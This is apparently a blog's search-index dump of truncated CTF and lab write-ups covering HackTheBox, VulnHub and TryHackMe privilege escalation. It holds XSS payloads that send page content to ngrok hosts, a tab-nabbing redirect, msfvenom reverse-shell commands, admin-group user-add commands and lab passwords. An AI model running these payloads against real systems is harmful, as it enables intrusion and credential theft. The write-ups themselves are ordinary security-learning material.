334, Lines: 38] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] welcome.php [Status: 302, Size: 0, Words: 1, Lines: 1] register.php [","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:2:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Foothold Following the Article steps : 1- clone the Login page source code 2- add the following in the source code which the data will be redirected to \u003cscript\u003e window.opener.location = \"http://192.168.1.11:9090\"; \u003c/script\u003e\rnote: add other port rather than the http port because it is a POST request so the data submitted will not appear at the uri in the http server 3- Host the page and submit the URL and after 2 minutes we got the Juicy stuff : now we have this credentials after URL decoding dan","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:3:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Lateral movement First thing that have my attention is the administrators group , so let’s check what is interesting about this group daniel@napping:~$ find / -group administrators 2\u003e/dev/null /home/adrian/query.py daniel@napping:~$ ls -l /home/adrian/query.py -rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 /home/adrian/query.py\rnice we have write access to that folder , we can edit it but then what ? , we need also user adrian to execute it and there should be some crontab running to achieve","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:4:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"root Access and the root part is really easy : sudo /usr/bin/vim # press ESC then\rAnd the machine has been pwned ;) ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:5:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"After root Under /var/spool/cron/crontabs/adrian we can see */2 * * * * /usr/bin/python3 /home/adrian/query.py\rand under /var/spool/cron/crontabs/root */2 * * * * /usr/bin/python3 /root/nap.py\rThe script was checking for the opener.location in the page the admin visit and if present it will submit the data data = { \"username\":\"daniel\", \"password\":\"C@ughtm3napping123\" } elif (search.find('opener.location') != -1): match = re.findall(\"http(.*);\",search) new_url = 'http' + match[0].rstrip(match[0][","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:6:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access Scanning : initial scan : nmap -sV -A -T 4 $IP -o","date":"2022-05-21","objectID":"/posts/linux-machines/2022-05-21-pandora/:0:0","tags":["Hackthebox","snmp","port-forwarding","Path-Poisoning"],"title":"Pandora Hackthebox writeup","uri":"/posts/linux-machines/2022-05-21-pandora/"},{"categories":["Linux Machines"],"content":"pwned","date":"2022-05-21","objectID":"/posts/linux-machines/2022-05-21-pandora/:0:1","tags":["Hackthebox","snmp","port-forwarding","Path-Poisoning"],"title":"Pandora Hackthebox writeup","uri":"/posts/linux-machines/2022-05-21-pandora/"},{"categories":["Web Exploitation"],"content":"HTB Cyber Apocalypse CTF 2022 was held from the 14th of May Until the 19th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy CTF name Cyber Apocalypse CTF 2022 challenge Kryptos Support category web about XSS , IDOR team 0xCha0s ","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:0:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Web Exploitation"],"content":"Discovery : This easy challenge are introduced with this page , as we see just add a report issue interface: There is also end point /login But there is no /signup or register and First thing i have tried is to get xss , i used xsshunter as a proof only latter on will use ngrok http server : \u003cscript src=https://XXXXXXX.xss.ht\u003e\u003c/script\u003e\rand we get a hit : we know from the report the following : vulnerable page http://127.0.0.1:1337/tickets/new the session used is JWT based: session=eyJhbGciOiJIUz","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:1:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Web Exploitation"],"content":"Attacking : I wanted to get an overview about what functions are there in the /settings page. so we craft this payload : var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://127.0.0.1:1337/settings\"); xhr.onload = function () { var out = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://3bbd-156-194-235-84.ngrok.io/?out=\" + out); exfil.send(); }; xhr.send();\rand will use this payload at the report page to request the script we host : \u003cscript src=\"http://3bbd-","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:2:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Linux Machines"],"content":"In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system. Scanning nmap -A -T5 10.10.11.126 -oN nmap/intial.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; ","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:0:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Linux Machines"],"content":"Analyzing the binary Downloading the Binary and start analyzing it , searching online found some tools which can help us de-compile a python binary and the binary we have looks like a python binary indeed commands used : git clone https://github.com/LucifielHack/pyinstxtractor.git git clone https://github.com/LucifielHack/pycdc.git wget https://github.com/Kitware/CMake/releases/download/v3.23.1/cmake-3.23.1.tar.gz tar xzvf cmake-3.23.1.tar.gz cd cmake-3.23.1 ./bootstrap make sudo make install cm","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:1:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Linux Machines"],"content":"Root Access now we want to login as root , i have downloaded the root id_rsa But unable to login with it. we can try uploading our public key at the /root/.ssh/authorized_keys , then try to connect with our private key. As we have option to download let’s download our public key , But we can’t specify where to save it: Seems the space is the problem , and hence the ’}’ and ’{’ are not filter we can make use of this technique: which the spaces are replaced with the ’,’ then let’s connect : ssh -i","date":"2022-05-07","objectID":"/posts/linux-machines/2022-05-07-unicode/:2:0","tags":["Hackthebox","JWT","directory-traversal","decompile-binary"],"title":"Unicode Hackthebox writeup","uri":"/posts/linux-machines/2022-05-07-unicode/"},{"categories":["Web Exploitation"],"content":"Nahamcon ctf 2022 was held from the 28th of April Until the 30th of the month , and we have participated under the team 0xcha0s. this challenge idea was pretty new to me so it is helpful to document it in this writeup CTF name NahamconCTF 2022 challenge Hacker Ts category web about HTML injection team 0xCha0s we are introduced with this page , it can take a text as input and we can also specify the color and the output is : Also we can see the Admin tab above it shows the following : So our goal","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:0:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 1 \u003ch1 id=\"0xMesbaha\"\u003e\u003c/h1\u003e \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\", false); xhr.send(); document.getElementById(\"0xMesbaha\").innerHTML = xhr.responseText; \u003c/script\u003e\rthe false in xhr.open : async parameter which is optional , If this value isÂ false, theÂ send()Â method does not return until the response is received.\r","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:1:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 2 we can also use other payload to take the response then send it to remote server : in the text input : \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\"); xhr.onload = function () { var flag = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://ee3f-156-194-180-190.ngrok.io/?flag=\" + flag); exfil.send(); }; xhr.send(); \u003c/script\u003e\rdecode it : ","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:2:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Web Exploitation"],"content":"Approach 3 we can also go to another approach , which is hosting exploit.js contains : var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://localhost:5000/admin\"); xhr.onload = function () { var flag = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://6ce0-156-194-180-190.ngrok.io/?flag=\" + flag); exfil.send(); }; xhr.send();\rthen on the text input use : \u003cscript src=\"http://6ce0-156-194-180-190.ngrok.io/exploit.js\"\u003e\u003c/script\u003e\rsame output : ","date":"2022-05-02","objectID":"/posts/web-exploitation/2022-05-02-hacker-ts/:3:0","tags":["CTF","html injection","SSRF"],"title":"Hacker Ts challenge writeup","uri":"/posts/web-exploitation/2022-05-02-hacker-ts/"},{"categories":["Windows Machines"],"content":"During studying the TCM windows privilege escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist this room covers : Service Escalation - Unquoted Service Paths Service Escalation - DLL Hijacking Service Escalation - Registry Service Escalation - Executable Files Service Escalation - binPat","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:0:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service-Escalation - Unquoted Service Paths Unquoted path escalation is the case when a service path is like : C:\\Program Files\\example 2\\app.exe\rwhat happens to run the app.exe is as following: # Try :\rC:\\Program.exe\r# if not found try :\rC:\\Program Files\\example.exe\r# if not found try :\rC:\\Program Files\\example 2\\app.exe\rso if we have write access to the C:\\program Files\\ we can place our example.exe so it can be used instead of the actual app.exe , and we can place a malicious app that can get","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:1:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - DLL Hijacking My favorite escalation way , DLL Hijacking is very common escalation Factor you should consider,it is a little tricky to detect But easy to abuse. attackers usually copy the suspected executables and run them at their lab to analyze them in this lab we are working in same machine , you need Process Monitor it is like pspy in linux But it tells us details about a process as we will see the idea behind DLL Hijacking is : finding a process searches for a DLL and n","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:2:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - Registry List them : reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\rsearch for a service has NT AUTHORITY\\INTERACTIVE allow FullControl : Get-Acl HKLM:\\SYSTEM\\CurrentControlSet\\Services\\regsvc | fl\ruse the code here add what ever code you want to execute for example add current user to the administrator group cmd.exe /k net localgroup administrators user /add\rcross compile it : i686-w64-mingw32-gcc windows_service.c -o fake.exe\rsend it to the windows then : reg add HKLM\\SY","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:3:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - Executable Files finding a service we can overwrite and restart the service will gain us a reverse shell we can search for them by a tool like powerup.ps1 or manually with accesschk64.exe on the services running , we can list them with powershell: Get-Service | Where-Object {$_.Status -eq \"Running\"}\ror cmd : sc.exe query type=service\rwe see this file has write access by every body , we can simply generate with msfvenom a reverse executable and replace it , then start the ser","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:4:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Service Escalation - binPath we are after a service that has RW access for Everyone , we can search for it with : .\\accesschk64.exe -wuvc Everyone *\rif we have the : SERVICE_CHANGE_CONFIG we can now leverage our privilege by writing a new configuration then start the service sc config daclsvc binpath= \"net localgroup administrators user /add\"\r","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:5:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Potato Escalation - Hot Potato the potato attacks are so famous when it comes to windows , actually there are more than one type of potato attack , you can refer to this blog. the attack vector was fixed in MS16-075 , probably windows 7 is vulnerable. we can list last updates : wmic qfe list full /format:table\rsearching for the 3 installs , will find none of them patching the vuln there are multiple ways to attack hot potato like metasploit , powershell , potato.exe , refer here . .\\tater.ps1 In","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:6:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Registry Escalation - Autorun first you need to run Autoruns64.exe to list the auto runs applications we can notice the program.exe running under C:\\Program Files\\Autorun Program\\ ,now we should use accesschk64.exe to check our privilege on that path it has read/write access For everyone , so we can replace the program.exe with a malicious payload to gain a reverse shell as higher privilege msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=9090 -f exe -o program.exe\rfire up your ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:7:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Registry Escalation - AlwaysInstallElevated check AlwaysinstalledElevated is on if the value = 0x1 reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\rcraft msi payload : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi\rmove it to the machine and run it : ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:8:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Privilege Escalation - Startup Applications we can search for this attack vector by running : icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\rwe can see that Builtin\\Users has the F flag meaning full control , Built-in user account isÂ a type of user account that is created during installation simply copy a malicious executable to C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ then when an administrator logs in you will gain a reverse shell ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:9:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Password Mining Escalation - Memory the discussed attack can be helpful in phishing demonstration , will use metasploit as : msfconsole -x \"use auxiliary/server/capture/http_basic;set uripath x ; run\"\rThis module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console and we have captured his password as we see ;) for password mining winpeas are helpful hence it searches f","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:10:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Privilege Escalation - Kernel Exploits when it comes to old versions of windows (xp,7,8) it most likely can be exploit using kernel exploitation techniques. to detect if it is vulnerable , run systeminfo ,take the output and pass it to Windows-Exploit-Suggester tool NOTE windows-exploit-suggester can reveal other attack vectors rather than the kernel exploits python windows-exploit-suggester.py --database 2022-04-25-mssb.xls --systeminfo ~/CTFs/Tryhackme/windowsprivescarena/kernel_search\rbut the","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:11:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Automation there a lot of tools you can use like Winpeas , But Let’s Try PowerUp.ps1 ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:12:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Quick commands Download files from your http server to windows : certutil -urlcache -f \u003curl\u003e \u003coutfile_name\u003e Invoke-WebRequest -Uri \u003curl\u003e -OutFile \u003coutfile_name\u003e\rRemember if you are going to use ftp server , in case moving exe files to use binary on Generate payloads : # exe payload to get reverse shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=1337 -f exe -o common.exe # exe payload to execute commands msfvenom -p windows/exec CMD='net localgroup administrators user /add'","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:13:0","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Windows Machines"],"content":"Useful Resources : Potatoes_Windows_Privesc windows-enumeration msfveom-cheatsheet PayloadsAllTheThings hacktricks lolbas-project ","date":"2022-04-26","objectID":"/posts/windows-machines/2022-04-26-windowsprivescarena/:13:1","tags":["TryHackme","windows-privesc"],"title":"Windows-PrivEsc-Arena TryHackMe writeup","uri":"/posts/windows-machines/2022-04-26-windowsprivescarena/"},{"categories":["Linux Machines"],"content":"In this easy Linux box we are facing a wordpress plugin vulnerable to directory traversal letting us reading some files on the system , brute forcing the /proc/[pid] found a vulnerable gdb server running , exploiting it will gain low privilege shell , then abusing the screen binary to get the root access. Scanning starting with a basic scanning : nmap -A -T5 10.10.11.125 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ","date":"2022-04-23","objectID":"/posts/linux-machines/2022-01-21-backdoor/:0:0","tags":["Hackthebox","wordpress","Waste","directory Traversal","gdb server","screen"],"title":"Backdoor Hackthebox writeup","uri":"/posts/linux-machines/2022-01-21-backdoor/"},{"categories":["Linux Machines"],"content":"[BONUS] After root running crontab -e to see how things were configured to work : we can see the gdb server and the Screen binary cron jobs ","date":"2022-04-23","objectID":"/posts/linux-machines/2022-01-21-backdoor/:0:1","tags":["Hackthebox","wordpress","Waste","directory Traversal","gdb server","screen"],"title":"Backdoor Hackthebox writeup","uri":"/posts/linux-machines/2022-01-21-backdoor/"},{"categories":["Web Exploitation"],"content":"DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy. CTF name DCTF 2022 challenge SQL Tutor category web about SQL injection description I found this awesome site for learning SQL. Check it out! points 200 team 0xCha0s solved By 0xMesbaha and itsFading ","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:0:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Discovery we are introduced with this page which execute fixed SQL statements and take one input to fill the ... in the query However it wasn’t that easy , there are some filters for special characters like [ ' \" `] and for some words like UNION ","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:1:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Enumeration Intercepting the request with Burpsuite to see what is going on , we can see the following : POST /verify_and_sign_text HTTP/1.1 Host: sqltutor.dragonsec.si User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 22 Origin: https://sqltutor.dragonsec.si Te: trailers Connectio","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:2:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Web Exploitation"],"content":"Exploitation we can automate the process to save the time and for efficiency , Let’s Build the script : sending the request for the 1st time to extract the signature value : #!/usr/bin/python3 import requests import base64 url= \"https://sqltutor.dragonsec.si/execute\" payload =\"\"\"testme \"\"\".encode('utf-8') encoded=base64.b64encode(payload).decode('utf-8') data = { \"text\":encoded, \"signature\":\"dummy\", \"queryNo\":\"0\", \"debug\":\"true\" } r1= requests.post(url,data=data) print(r1.text)\rwe will extract t","date":"2022-04-17","objectID":"/posts/web-exploitation/2022-04-17-sql-tutor/:3:0","tags":["CTF","SQL injection","python"],"title":"SQL Tutor challenge writeup","uri":"/posts/web-exploitation/2022-04-17-sql-tutor/"},{"categories":["Linux Machines"],"content":"In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version Scanning : basic scanning : nmap -A -T4 10.10.11.124 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-","date":"2022-04-01","objectID":"/posts/linux-machines/2022-04-01-shibboleth/:0:0","tags":["Hackthebox","ipmi","maria-DB","zabbix"],"title":"Shibboleth Hackthebox writeup","uri":"/posts/linux-machines/2022-04-01-shibboleth/"},{"categories":["Linux Machines"],"content":"In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has PR_SET_DUMPABLE so we can dump it if it receives a signal ","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:0:0","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"Analyzing the code we can see the file we supply will be loaded , then the function will count it line by line and word by word,..etc we can also see this comment and this code line : this seems irregular to me prctl(PR_SET_DUMPABLE, 1);\rchecking prctl() manual here we can find : hence it is set to 1 in our case this means we can dump it if it receives a signal like “interrupt” while it is running so we will get another reverse shell on another port in shell-1 : run the binary and specify the fi","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:0:1","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"Root Access Hence we Have port 22 open ,now save the id_rsa and : chmod 600 id_rsa ssh root@10.10.11.120 -i id_rsa\r","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:1:0","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command “file” which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root Scanning ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Discovery we can start enumerating the devzat.htb web application first. we can see it talks about some chat application and can try it with : so we can try it using : ssh -l Mesbaha devzat.htb -p 8000\rlooking for help to know how to use it : okay we will check it latter after we finish discovery phase visiting pets.devzat.htb we have the option to add new item we can also see how the request is sent : okay now we have some leads , we can also start directory busting to check if there is somethi","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:1","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Directory Busting dirsearch -u http://devzat.htb/ -w /usr/share/wordlists/dirb/common.txt [06:55:30] 301 - 309B - /assets -\u003e http://devzat.htb/assets/ [06:55:35] 301 - 309B - /images -\u003e http://devzat.htb/images/ [06:55:35] 200 - 6KB - /index.html [06:55:35] 301 - 313B - /javascript -\u003e http://devzat.htb/javascript/ [06:55:40] 403 - 275B - /server-status\rdirsearch -u http://pets.devzat.htb/ -w /usr/share/wordlists/dirb/common.txt [06:58:36] 200 - 23B - /.git/HEAD [06:58:39] 301 - 42B - /build -\u003e /","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:2","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Enumerating the machine at the /etc/passwd we can see this strange backup backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rwe can visit this /var/backups/ maybe it contains useful information can help us escalate our privilege But only user catherine can use it so we should find a way to escalate to this user first :( -rw------- 1 catherine catherine 28297 Jul 16 2021 devzat-dev.zip\r-rw------- 1 catherine catherine 27567 Jul 16 2021 devzat-main.zip\rif we run ss-lpnut tcp 0 0 127.0.0.1:5000 0","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:1:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"port forward forward port 8086 from the machine to your side. first: generate ssh keys ssh-keygen -f devzat\rand put your public key at the authorized_keys on the machine side Second: forward the port : # at your side ssh -i devzat -N -L 8086:127.0.0.1:8086 patrick@devzat.htb\rnow if we have scanned our localhost will find : if we search for this version of the service will find immediatley this exploit and we can see the user catherine shows up with this password : woBeeYareedahc7Oogeephies7Aisec","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:1:1","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Pwned ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:2:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Windows Machines"],"content":"In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren’t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service “spooler” and add a user in the administrator group. ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:0:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Scanning : nmap -T 4 -A -sV 10.10.11.106 -oN nmap_intial.txt\routput : PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\\'t have a title (text/html; charset=UTF-8). 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Wi","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:1:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Enumeration: we can start by visiting the web page and it will ask us for a username:password for MFP firmware update center . searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is “admin:admin” using them will login successfully : we can add 